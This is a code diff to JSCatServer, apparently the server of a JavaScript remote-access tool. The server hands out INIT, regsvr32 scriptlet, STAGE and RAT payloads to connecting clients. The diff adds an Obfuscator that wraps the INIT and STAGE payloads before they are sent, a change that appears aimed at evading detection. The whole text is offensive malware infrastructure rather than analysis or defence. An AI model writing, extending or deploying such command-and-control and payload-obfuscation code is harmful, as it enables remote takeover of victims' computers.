@@ -6,6 +6,7 @@ from .payload import Payload
 from .color import BOLD
 from .cipher import ARC4
 from .log import Log
+from .obfuscator import Obfuscator
 
 
 class JSCatServer(BaseHTTPRequestHandler):
@@ -87,6 +88,7 @@ class JSCatServer(BaseHTTPRequestHandler):
             context = Payload.init(self.server.host, self.server.port)
             Log.log_message('\n[+]received {} client:{}'.format(BOLD('INIT'),
                                                                 BOLD(self.client_address[0])), log_type=Log.SERVER)
+            context = Obfuscator(context)
         elif self.path.startswith('/file.sct'):
             context = Payload.regsvr(self.server.host, self.server.port)
             Log.log_message('\n[+]received {} client:{}'.format(BOLD("REGSVR32"),
@@ -96,6 +98,7 @@ class JSCatServer(BaseHTTPRequestHandler):
                 self.server.host, self.server.port, self.server.rc4_key)
             Log.log_message('\n[+]received {} client:{}'.format(BOLD('STAGE'),
                                                                 BOLD(self.client_address[0])), log_type=Log.SERVER)
+            context = Obfuscator(context)
         elif self.path == '/rat':
             context = Payload.rat(
                 self.server.host, self.server.port, self.server.rc4_key, self.server.sleep_time)
@@ -103,6 +106,7 @@ class JSCatServer(BaseHTTPRequestHandler):
                 self.client_address[0])
             Log.log_message('\n[+]received {} client:{}'.format(BOLD('RAT'),
                                                                 BOLD(self.client_address[0])), log_type=Log.SERVER)
+
         self.__to_reply(200, context)
 
     '''
